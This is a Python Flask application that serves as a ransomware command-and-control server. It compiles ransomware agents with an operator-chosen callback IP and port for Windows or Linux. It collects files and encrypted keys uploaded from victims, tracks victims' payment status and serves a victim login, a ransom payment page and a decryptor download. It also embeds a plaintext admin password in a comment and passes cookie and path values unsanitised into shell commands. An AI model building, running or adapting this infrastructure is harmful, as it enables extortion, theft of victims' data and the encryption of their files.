from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, send_file, jsonify, send_file, make_response
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import os
import uuid
import random
import string
import time
import subprocess
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime

app = Flask(__name__)
key = os.urandom(24)
app.config['SECRET_KEY'] = key
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
login_manager = LoginManager(app)

# Define the folder where we will receive all the files
RECEIVED_FOLDER = 'received'
app.config['RECEIVED_FOLDER'] = RECEIVED_FOLDER

# Define the table User and Victim
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(20), unique=True, nullable=False)
    password = db.Column(db.String(60), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)
    
class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(2000), unique=True, nullable=False)
    payment_status = db.Column(db.Boolean, default=False)

# Create the table
with app.app_context():
    db.create_all()

#def create_user(username, password):
    #new_user = User(username=username)
    #new_user.set_password(password)
    #db.session.add(new_user)
    #db.session.commit()

# Generate the login form 
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Login')

# Define the main page 
@app.route('/')
def home():
    #create_user('esgikingpirate', 'Ilovechuu93!')
    return render_template('home.html')

# Login page for the admin dashboard
@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        # If login successful, login
        if user and user.check_password(form.password.data):
            login_user(user)
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Login unsuccessful. Please check your username and password.', 'danger')
    return render_template('login.html', form=form)

# Admin dashboard
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

# Admin logout
@app.route('/logout')
@login_required
def logout():
    logout_user()
    # Going back to the main page
    return redirect(url_for('home'))

# Page to show all received files
@app.route('/received')
@login_required
def received_files():
    received_folder = app.config['RECEIVED_FOLDER']
    folders = [folder for folder in os.listdir(received_folder) if os.path.isdir(os.path.join(received_folder, folder))]

    # Print the date when we created the folder
    folder_info = []
    for folder in folders:
        folder_path = os.path.join(received_folder, folder)
        command = "/usr/bin/stat -c %w /var/www/c2/" + folder_path
        birth_time = os.popen(command).read().strip()
        folder_info.append({'name': folder, 'birth': birth_time.split('.')[0]})
    
    return render_template('received_files.html', folders=folder_info)

# Open specific folder which is in "received"
@app.route('/received/<folder_name>')
@login_required
def show_folder(folder_name):
    # Show all the content of a specific folder chosen in the previous page
    folder_path = os.path.join(app.config['RECEIVED_FOLDER'], folder_name)
    full_id = get_full_id(folder_path)
    files = os.listdir(folder_path)

    file_info = []
    for file in files:
        file_path = os.path.join(folder_path, file)
        command = "/usr/bin/stat -c %w /var/www/c2/" + file_path
        birth_time = os.popen(command).read().strip()      
        file_info.append({'name': file, 'birth': birth_time.split('.')[0]})
    
    return render_template('folder.html', folder_name=full_id, files=file_info)

# Download a file by clicking on it on the interface
@app.route('/download/<folder_name>/<filename>')
@login_required
def downloaded_file(folder_name, filename):
    # Return the file chosen as an attachment
    return send_from_directory(os.path.join(app.config['RECEIVED_FOLDER'], folder_name), filename, as_attachment=True)

# Preview a file by clicking on the preview button
@app.route('/preview/<folder_name>/<filename>')
@login_required
def preview_file(folder_name, filename):
    # Return the file chosen for preview
    return send_from_directory(os.path.join(app.config['RECEIVED_FOLDER'], folder_name), filename, as_attachment=False)

# Function to get the encrypted AES in RSA by the folder name
# The folder name is the first 10 caracters of the encrypted AES
def get_full_id(folder_path):
    id_file_path = os.path.join(folder_path, 'id.txt')
    with open(id_file_path, 'r') as id_file:
        full_id = id_file.read().strip()
    return full_id

# Payload generator
@app.route('/generate', methods=['GET','POST'])
@login_required
def generate():
    if request.method == 'POST':
        # In the form, the user give an IP or Domain name + Port + type of machine that he wants to attack, we getting it
        ip_address = request.form['ip']
        port = request.form['port']
        choice = request.form['choice']

        # We open the code and keep all of it in a variable
        with open('/var/www/c2/Payload/src/ransom_agent/main.c', 'r') as file:
            code_content = file.read()

        # Go in the code to found a specific line and change it by the IP/Domain + Port chosen by the user
        ip_change = code_content.replace('char ip[] = "127.0.0.1";', f'char ip[] = "{ip_address}";')
        ip_port_change = ip_change.replace('int port = 42956;', f'int port = {port};')

        # Creating a new code file and apply the changes
        with open('/var/www/c2/Payload/src/ransom_agent/new_main.c', 'w') as file:
            file.write(ip_port_change)

        # If the user choose Windows
        if choice == 'Windows':
            # Compiling
            command = '/usr/bin/x86_64-w64-mingw32-gcc -o /var/www/c2/Payload/src/ransom_agent/program.exe /var/www/c2/Payload/src/ransom_agent/new_main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/include -I/var/www/c2/Payload/openssl-3.0.14/include  -L/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/lib -L/var/www/c2/Payload/openssl-3.0.14 -Wl,-rpath,/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/bin -lcurl -lssl -lcrypto -lws2_32 -lwsock32 -lbcrypt'
            os.system(command)

            # Return the executable program   
            file_path = '/var/www/c2/Payload/src/ransom_agent/program.exe'

            return send_file(file_path, as_attachment=True)

        # If the user choose Linux
        elif choice == 'Linux':       
            # Compiling
            command = '/usr/bin/gcc /var/www/c2/Payload/src/ransom_agent/new_main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/usr/bin/as -lcurl -lssl -lcrypto -w -o /var/www/c2/Payload/src/ransom_agent/program -B /usr/bin/'
            ok = os.system(command)
                
            # Return the executable program  
            file_path = '/var/www/c2/Payload/src/ransom_agent/program'

            return send_file(file_path, as_attachment=True)


        
    return render_template('generate.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    # If there is no file or not the id mentionned, return an error
    if 'file' not in request.files or 'id' not in request.form:
        return "No file selected\n", 400

    # Getting the file and the value of the ID
    file = request.files['file']
    id = request.form['id']

    # Use the 10 first caracters of the encrypted key as folder name
    folder_name = id
    folder_path = os.path.join(app.config['RECEIVED_FOLDER'], folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    # Use the full encrypted key and keep it in a text file
    id_file_path = os.path.join(folder_path, 'id.txt')
    with open(id_file_path, 'w') as id_file:
        id_file.write(id)

    # Save the received file in the folder with 
    file_path = os.path.join(folder_path, file.filename)
    file.save(file_path)

    # Getting the full of value the encrypted aes key 
    path_encrypt_aes = folder_path + "/aes_key.txt"
    with open(path_encrypt_aes , 'r') as fichier:
        encrypt_aes = fichier.read()

    # Putting it in victim table to stock it for the Victim login
    existing_victim = Victim.query.filter_by(key=encrypt_aes).first()
    if existing_victim is None:
        new_victim = Victim(key=encrypt_aes)
        db.session.add(new_victim)
        db.session.commit()
    
    return "\n"

# Login for victim
@app.route('/victim_login', methods=['GET', 'POST'])
def victim_login():
    message = None
    if request.method == 'POST':
        key = request.form['key']
        # Check if the encrypted aes ket that the user enter is in the victim table
        victim = Victim.query.filter_by(key=key).first()
        if victim:
            response = make_response(redirect(url_for('pay') if not victim.payment_status else url_for('paid')))
            # If its working put the value of the key in a cookie
            response.set_cookie('key', key)
            return response
        else:
            message = "Invalid key. Please try again."

    return render_template('victim_login.html', message=message)

# Payment instructions page
@app.route('/pay')
def pay():
    return render_template('pay.html')

# Paid page
@app.route('/paid')
def paid():
    return render_template('paid.html')

# Function to find the right iv for the right aes key
def find_iv(path):
    with open(path, 'r', encoding='utf-8') as fichier:
        contenu = fichier.read()
    return contenu

# Download the decryption program from the paid page
@app.route('/download_decryption', methods=['GET', 'POST'])
def download_decryption():
    if request.method == 'POST':
        # Getting the OS chosen by the user
        choice = request.form.get('os')
        
        # Get the key value that used to connect with 
        encrypt_aes = request.cookies.get('key')

        # Path to the right folder
        path_encrypt_aes = encrypt_aes[:10]
        path = '/var/www/c2/received/' + path_encrypt_aes + '/iv.txt'
        encrypt_iv = find_iv(path)

        # Decode the encrypted AES key and put it in a text file
        os.system("rsa_decoder/aes_decoder " + encrypt_aes + " > clear_aes.txt")
        
        # Get the AES key (not encrypted)
        with open('clear_aes.txt', 'r') as fichier:
            clear_aes = fichier.read()

        # Decode the encrypted IV and put it in a text file
        os.system("rsa_decoder/iv_decoder " + encrypt_iv + " > clear_iv.txt")

        # Get the IV (not encrypted)
        with open('clear_iv.txt', 'r') as fichier:
            clear_iv = fichier.read()

        # Open the decryption code and keep it in a variable
        with open('decryptor/main.c', 'r') as file:
            code_content = file.read()

        # Change specific lines of the code to put the right AES Key and IV
        aes_change = code_content.replace('char* aes_string = "33a6d2d0df5214491ebc2b3540ed97c31838b6dd35cbec74c6efad5280efec65";', f'char* aes_string = "{clear_aes}";')
        iv_aes_change = aes_change.replace('char* iv_string = "d9822cbd2bff813630764fa8b004904d";', f'char* iv_string = "{clear_iv}";')

        # Write the changes in a new file
        with open('decryptor/new_main.c', 'w') as file:
            file.write(iv_aes_change)

        # If the user choose Windows
        if "Windows" in choice:
            # Compile and the binary program will be returned
            os.system("decryptor/compile_w.sh")
            return send_file("decryptor/XDXDXDXDXDXD.exe", as_attachment=True)

        # If the user choose Linux
        elif "Linux" in choice:
            # Compile and the exe program will be returned
            os.system("decryptor/compile.sh")
            return send_file("decryptor/XDXDXDXDXDXD", as_attachment=True)

# List of victims pages
@app.route('/victims', methods=['GET', 'POST'])
@login_required
def victims():
    if request.method == 'POST':
        victim_ids = request.form.getlist('victim_ids')
        for victim_id in victim_ids:
            victim = Victim.query.get(victim_id)
            if victim:
                # Change payment status (Paid/Not paid)
                payment_status = request.form.get(f'payment_status_{victim_id}', '0') == '1'
                victim.payment_status = payment_status
                db.session.commit()

    victims = Victim.query.all()
    return render_template('victims.html', victims=victims)

if __name__ == '__main__':
    # Uncomment the line below to create a user
    app.run(host="0.0.0.0", port=4295, debug=True)
